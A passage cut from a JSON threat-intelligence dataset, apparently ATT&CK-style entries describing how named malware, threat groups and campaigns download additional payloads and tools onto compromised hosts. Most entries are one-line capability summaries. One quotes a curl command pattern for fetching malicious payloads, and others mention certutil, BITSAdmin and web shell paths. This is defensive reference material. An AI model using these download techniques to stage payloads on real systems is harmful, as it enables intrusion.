onto a victim machine."}, {"id": "S0095", "name": "ftp", "description": "ftp may be abused by adversaries to transfer tools or files from an external system into a compromised environment."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can download additional files onto a compromised host."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors downloaded additional droppers and backdoors onto a compromised system."}, {"id": "S0628", "name": "FYAnti", "description": "FYAnti can download additional payloads to a compromised host."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has downloaded additional malware and tools onto a compromised host. For example, Gamaredon Group uses a backdoor script to retrieve and decode additional payloads once in victim environments."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can execute a task to download a file."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can download additional plug-ins to a compromised host."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can download files to the victim\u2019s machine."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon can download additional components from the C2 server."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy constantly attempts to download and execute files from the remote C2, including GoldenSpy itself if not found on the system."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax can download and execute additional files."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can fetch second stage code from hardcoded web domains."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can download additional files from C2 servers."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can download its second stage from a hardcoded URL within the loader's code."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy can download additional modules and payloads."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to download and execute additional payloads."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader can download further malware for execution on the victim's machine."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has the ability to download additional files from C2."}, {"id": "S0214", "name": "HAPPYWORK", "description": "can download and execute a second-stage payload."}, {"id": "S0170", "name": "Helminth", "description": "Helminth can download additional files."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has downloaded additional payloads and malicious scripts onto a compromised host."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor has the ability to upload and download files from its C2 server."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp downloads a tar compressed archive from a download server to the system."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has the ability to download files to a compromised host."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has downloaded additional scripts that build and run Monero cryptocurrency miners."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has the ability to connect to a remote host in order to upload and download files."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to upload a file from the command and control (C2) server to the victim machine."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser is capable of writing a file to the compromised system from the C2 server."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can download files and additional malware components."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has the ability to download additional files."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has the ability to download additional modules and a configuration file from C2."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader is a loader used to retrieve follow-on payload encoded in email messages for execution on victim systems."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has downloaded tools to compromised servers including Advanced IP Scanner. "}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra has downloaded additional files and tools from its C2 server."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer downloads a shellcode payload from a remote C2 server and loads it into memory."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can upload files to the victim's machine for operations."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can download and execute additional files."}, {"id": "S0528", "name": "Javali", "description": "Javali can download payloads from remote C2 servers."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT can retrieve an additional payload from its C2 server. JHUHUGIT has a command to download files to the victim\u2019s machine."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can download files and upgrade itself."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can download and execute files."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has the ability to download malicious executables to a compromised host."}, {"id": "S0215", "name": "KARAE", "description": "KARAE can upload and download files, including second-stage malware."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to download and execute additional files."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar downloads additional plug-ins to load on the victim\u2019s machine, including the ability to upgrade and replace its own binary."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used tools to download files to compromised machines."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can download specific payloads to a compromised host based on OS architecture."}, {"id": "S0487", "name": "Kessel", "description": "Kessel can download additional modules from the C2 server."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can download files to the compromised host."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy has a download and upload functionality."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE can upload files to the victim\u2019s machine and can download additional payloads."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has the ability to download and execute code from remote servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has downloaded additional scripts, tools, and malware onto victim systems."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has downloaded additional lateral movement scripts from C2."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to download and execute files."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can download additional files and tools."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has executed a PowerShell command to download a file to the system."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can download files and execute them on the victim\u2019s machine."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs downloads additional files from C2 servers."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can download and execute PEs, DLLs, and shellcode from C2."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter had downloaded additional tools to a compromised host."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has downloaded additional scripts and files from adversary-controlled servers."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron has the ability to download and execute additional files."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can download files onto compromised hosts."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke has the ability to download files."}, {"id": "S0680", "name": "LitePower", "description": "LitePower has the ability to download payloads containing system commands to a compromised host."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can download additional plugins, files, and tools."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot downloaded several staged items onto the victim's machine."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner used SCP to update the miner from the C2."}, {"id": "S0042", "name": "LOWBALL", "description": "LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can download and execute a replica of itself using certutil."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has downloaded additional malware and tools onto a compromised host."}, {"id": "S0409", "name": "Machete", "description": "Machete can download additional files for execution on the victim\u2019s machine."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has downloaded additional files, including an exploit for used privilege escalation."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has used curl to download a Stripped Payloads from a public facing adversary-controlled webpage."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can download additional files onto the compromised host."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has downloaded additional code and files from servers onto victims."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can upload additional files to a compromised host."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has the ability to upload and download files to and from a compromised host."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz has the ability to download additional files to a compromised host."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has installed updates and new malware on victims."}, {"id": "G1013", "name": "Metador", "description": "Metador has downloaded tools and malware onto a compromised system."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can download files onto compromised systems."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used MSI files to download additional files to execute."}, {"id": "S0688", "name": "Meteor", "description": "Meteor has the ability to download additional files for execution on the victim's machine."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia can download and execute an executable from the C2 server."}, {"id": "S1015", "name": "Milan", "description": "Milan has received files from C2 and stored them in log folders beginning with the character sequence a9850d2f."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke can download additional encrypted backdoors onto the victim via GIF files."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has downloaded additional malware and files onto a compromised host."}, {"id": "S0083", "name": "Misdat", "description": "Misdat is capable of downloading files from the C2."}, {"id": "S0080", "name": "Mivast", "description": "Mivast has the capability to download and execute .exe files."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can download additional payloads from the C2."}, {"id": "G0021", "name": "Molerats", "description": "Molerats used executables to download malicious files from different sources."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can download files to targeted systems."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet retrieved a final stage payload from command and control infrastructure during initial installation on victim systems."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs can download and launch additional payloads."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has downloaded and installed web shells to following path C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito can upload and download files to the victim."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that can upload additional files to the victim\u2019s machine."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has downloaded additional executables following the initial infection stage."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has deployed secondary payloads and third stage implants to compromised hosts."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu can download additional files from URLs."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore has the capability to download and activate additional modules for execution."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT can download files remotely."}, {"id": "S0272", "name": "NDiskMonitor", "description": "NDiskMonitor can download and execute a file from given URL."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can download files from C2."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can download additional files onto a compromised host."}, {"id": "S0210", "name": "Nerex", "description": "Nerex creates a backdoor through which remote attackers can download files onto a compromised host."}, {"id": "S0457", "name": "Netwalker", "description": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can downloaded payloads from C2 to the compromised host."}, {"id": "S0118", "name": "Nidiran", "description": "Nidiran can download and execute files."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can load multiple additional plugins on an infected host."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can download files to the victim\u2019s machine."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI has downloaded a remote module for execution."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus has used malicious macros to download additional files to the victim's machine."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can download additional files and tools onto the victim\u2019s machine."}, {"id": "G0049", "name": "OilRig", "description": "OilRig can download remote files onto victims."}, {"id": "S0439", "name": "Okrum", "description": "Okrum has built-in commands for uploading, downloading, and executing files to the system."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE can download files from its C2 server to the victim's machine."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors downloaded additional malware and malicious scripts onto a compromised host."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, additional payloads were downloaded after a target was infected with a first-stage downloader."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors downloaded additional files to the infected system."}, {"id": "S0229", "name": "Orz", "description": "Orz can download files onto the victim."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can download payloads, and extract bytes from files. OSX/Shlayer uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has a command to download and execute a file on the victim\u2019s machine."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can download files from its C2 server."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can upload and download files to and from compromised hosts."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT can download additional payloads to a target system."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can load additional drivers and files onto a victim machine."}, {"id": "S0208", "name": "Pasam", "description": "Pasam creates a backdoor through which remote attackers can upload files."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork payloads download additional files from the C2 server."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can execute the command code do_download to retrieve remote files from C2."}, {"id": "S0643", "name": "Peppy", "description": "Peppy can download and execute remote files."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can install additional modules via C2 commands."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader has a command to upload a file to the victim machine."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE has downloaded and executed additional plugins."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has transferred files using the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel."}, {"id": "G1040", "name": "Play", "description": "Play has used Cobalt Strike to download files to compromised machines."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to upload and download files to and from an infected host."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module to download and execute files on the compromised machine."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a backdoor through which remote attackers can upload files."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can retrieve payloads from the C2 server."}, {"id": "S0453", "name": "Pony", "description": "Pony can download additional files onto the infected system."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY downloads and executes additional PowerShell code and Windows binaries."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has a command to download a file."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can download additional payloads to a compromised host."}, {"id": "S0685", "name": "PowerPunch", "description": "PowerPunch can download payloads from adversary infrastructure."}, {"id": "S0145", "name": "POWERSOURCE", "description": "POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER can download or upload files from its C2 server."}, {"id": "S0613", "name": "PS1", "description": "CostaBricks can download additional payloads onto a compromised host."}, {"id": "S0078", "name": "Psylo", "description": "Psylo has a command to download a file to the system from its C2 server."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can download and execute additional files."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can download additional files and payloads to compromised hosts."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can upload and download to/from a victim machine."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to download additional components and malware."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can download files to the victim\u2019s machine and execute them."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can download and execute payloads on a target host."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer downloads various library files enabling interaction with various data stores and structures to facilitate follow-on information theft."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can download files to a compromised host."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has downloaded additional malware, including by using certutil."}, {"id": "S0055", "name": "RARSTONE", "description": "RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin retrieves its second stage payload in a variety of ways such as through msiexec.exe abuse, or running the curl command to download the payload to the victim's %AppData% folder."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uploads and downloads information."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to drop additional files to an infected machine."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can download files via DNS."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves is capable of downloading a file from a specified URL."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can download files from C2."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can upload and download files to and from the victim\u2019s machine."}, {"id": "S0166", "name": "RemoteCMD", "description": "RemoteCMD copies a file over to the remote system before execution."}, {"id": "S0592", "name": "RemoteUtilities", "description": "RemoteUtilities can upload and download files to and from a target machine."}, {"id": "S0125", "name": "Remsec", "description": "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has the ability to upload and download files."}, {"id": "S0496", "name": "REvil", "description": "REvil can download a copy of itself from an attacker controlled IP address to the victim machine."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor uploads and downloads files to and from the victim\u2019s machine."}, {"id": "G0106", "name": "Rocke", "description": "Rocke used malware to download additional malicious files to the target system."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin can save a new file to the system from the C2 server."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can retrieve additional malicious payloads from its C2 server."}, {"id": "S0148", "name": "RTM", "description": "RTM can download additional files."}, {"id": "S0085", "name": "S-Type", "description": "S-Type can download additional files onto a compromised host."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can download additional files onto a compromised host."}, {"id": "S0074", "name": "Sakula", "description": "Sakula has the capability to download files."}, {"id": "S1099", "name": "Samurai", "description": "Samurai has been used to deploy other malware including Ninja."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to upload additional malicious files to a compromised machine."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to download a DLL from C2 to a compromised host."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke is capable of uploading and downloading files."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt has a command to download additional files."}, {"id": "S0185", "name": "SEASHARPEE", "description": "SEASHARPEE can download remote files onto victims."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper may download additional files to execute."}, {"id": "S0639", "name": "Seth-Locker", "description": "Seth-Locker has the ability to download and execute files on a compromised host."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has downloaded code from a C2 server."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon can download an executable to run on the victim."}, {"id": "S1019", "name": "Shark", "description": "Shark  can download additional files from its C2 via HTTP or DNS."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco has been used to download a Python interpreter to C:\\Users\\Public\\WinTN\\WinTN.exe as well as other plugins from external sources."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has the ability to download and execute additional payloads via a DropBox API."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has the ability to upload and download files."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can download additional files."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter had the ability to download additional payloads."}, {"id": "S0217", "name": "SHUTTERSPEED", "description": "SHUTTERSPEED can download and execute an arbitary executable."}, {"id": "S0589", "name": "Sibot", "description": "Sibot can download and execute a payload onto a compromised system."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has the ability to download additional files."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used LNK files to download remote files to the victim's network."}, {"id": "G0091", "name": "Silence", "description": "Silence has downloaded additional modules and malware to victim\u2019s machines."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can load additional files and tools, including Mimikatz."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to download files on an infected host."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "RAPIDPULSE can transfer files to and from compromised hosts."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can upload files from the C2 server to the victim machine using the upload command."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has downloaded files onto a victim machine."}, {"id": "S0218", "name": "SLOWDRIFT", "description": "SLOWDRIFT downloads additional payloads."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve has the ability to download files."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used Powershell to download UltraVNC and ngrok from third-party file sharing sites."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can download additional payloads to compromised systems."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can download additional malware to infected hosts."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster has the ability to download additional payloads from C2 to the targeted system."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has the ability to download and execute additional payloads."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can download additional payloads from C2."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp downloads and executes additional files from a remote server. "}, {"id": "S1140", "name": "Spica", "description": "Spica can upload and download files to and from compromised hosts."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette can download malicious files from threat actor controlled AWS URL's."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has downloaded and executed additional encoded payloads."}, {"id": "S1112", "name": "STEADYPULSE", "description": "STEADYPULSE can add lines to a Perl script on a targeted server to import additional Perl modules."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can download updates and auxiliary modules."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can download files to specified targets."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST delivered different payloads, including TEARDROP in at least one instance."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has the ability to download additional tools such as the RedLine Stealer to an infected host."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has the ability to download files to a compromised host."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used malicious scripts and macros with the ability to download additional payloads."}, {"id": "G0092", "name": "TA505", "description": "TA505 has downloaded additional malware to execute on victim systems."}, {"id": "G0127", "name": "TA551", "description": "TA551 has retrieved DLLs and installer binaries for malware execution from C2."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has downloaded additional files onto a compromised host."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can download additional modules from its C2 server."}, {"id": "S0164", "name": "TDTESS", "description": "TDTESS has a command to download and execute an additional file."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has the curl and wget commands as well as batch scripts to download new tools."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest can download and execute payloads in-memory or from disk."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has downloaded additional malware and tools, including through the use of certutil, onto a compromised host ."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can download additional tools to enable lateral movement."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla has the ability to act as a second-stage dropper used to infect the system with additional malware."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris can download files and execute them on a victim's system."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot downloads several additional files and saves them to the victim's machine."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can upload, download, and execute files on the victim."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used a delivered trojan to download additional files."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to upload and download files to and from the infected host."}, {"id": "S0647", "name": "Turian", "description": "Turian can download additional files and tools from its C2."}, {"id": "G0010", "name": "Turla", "description": "Turla has used shellcode to download Meterpreter after compromising a victim."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of downloading additional files."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can upload and download files to the victim\u2019s machine."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT can upload and download files to the victim\u2019s machine."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger is capable of downloading remote files."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT can download and upload files to and from the victim\u2019s machine."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use a Put command to write files to an infected machine."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has dropped payload and configuration files to disk. Ursnif has also been used to download and execute additional payloads."}, {"id": "S0476", "name": "Valak", "description": "Valak has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware."}, {"id": "S0636", "name": "VaporRage", "description": "VaporRage has the ability to download malicious shellcode to compromised systems."}, {"id": "S0207", "name": "Vasport", "description": "Vasport can download files."}, {"id": "S0442", "name": "VBShower", "description": "VBShower has the ability to download VBS files to the target computer."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN can download and upload files to the victim's machine."}, {"id": "G0123", "name": "Volatile Cedar", "description": "Volatile Cedar can deploy additional tools."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can download remote files and additional payloads to the victim's machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can download and execute additional files."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution used Curl.exe to download the Pikabot payload from an external server, saving the file to the victim machine's temporary directory."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can receive and load executables from remote C2 servers."}, {"id": "S0109", "name": "WEBC2", "description": "WEBC2 can download and execute a file."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can receive data and executable scripts from C2."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can write files to a compromised host."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can download additional stages of malware from a Discord CDN channel."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has the ability to download additional tools from the C2."}, {"id": "S0206", "name": "Wiarp", "description": "Wiarp creates a backdoor through which remote attackers can download files."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used tools to deploy additional payloads to compromised hosts."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host. "}, {"id": "S0141", "name": "Winnti for Windows", "description": "The Winnti for Windows dropper can place malicious payloads on targeted systems."}, {"id": "G0044", "name": "Winnti Group", "description": "Winnti Group has downloaded an auxiliary program named ff.exe to infected machines."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern executed PowerShell scripts to create scheduled tasks to retrieve remotely-hosted payloads."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE has the ability to download files to compromised devices."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has downloaded PowerShell code from the C2 server to be executed."}, {"id": 